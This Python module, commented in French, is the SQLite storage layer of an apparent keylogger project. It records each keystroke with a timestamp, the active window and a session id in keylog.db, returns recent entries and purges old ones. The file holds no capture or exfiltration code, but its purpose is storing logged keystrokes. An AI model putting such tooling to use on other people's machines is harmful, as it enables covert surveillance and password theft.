# ============================================================
#  storage/logger.py — Couche d'accès à la base SQLite
#  Rôle : seul module qui touche à keylog.db
#         Tous les autres passent par lui
# ============================================================

import sqlite3
import uuid
import sys
import os
from datetime import datetime

sys.path.append(os.path.join(os.path.dirname(__file__), ".."))
from config import DB_PATH

# Identifiant unique de la session courante
SESSION_ID = str(uuid.uuid4())[:8]


def init_db():
    """Crée la base et la table si elles n'existent pas."""
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS keystrokes (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp  TEXT    NOT NULL,
                key        TEXT    NOT NULL,
                window     TEXT,
                session_id TEXT    NOT NULL
            )
        """)
        conn.commit()


def log_key(key, window="unknown"):
    """Insère une frappe en base."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            "INSERT INTO keystrokes (timestamp, key, window, session_id) VALUES (?, ?, ?, ?)",
            (timestamp, key, window, SESSION_ID)
        )
        conn.commit()


def get_last(n=50):
    """Retourne les n dernières frappes."""
    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.execute(
            "SELECT timestamp, key, window FROM keystrokes ORDER BY id DESC LIMIT ?",
            (n,)
        )
        return cursor.fetchall()


def clear_old(days=7):
    """Supprime les entrées de plus de X jours."""
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            "DELETE FROM keystrokes WHERE timestamp < datetime('now', ?)",
            (f"-{days} days",)
        )
        conn.commit()


if __name__ == "__main__":
    init_db()
    log_key("test", "Terminal")
    print("Dernières frappes :")
    for row in get_last(5):
        print(f"  [{row[0]}] {row[2]} → {row[1]}")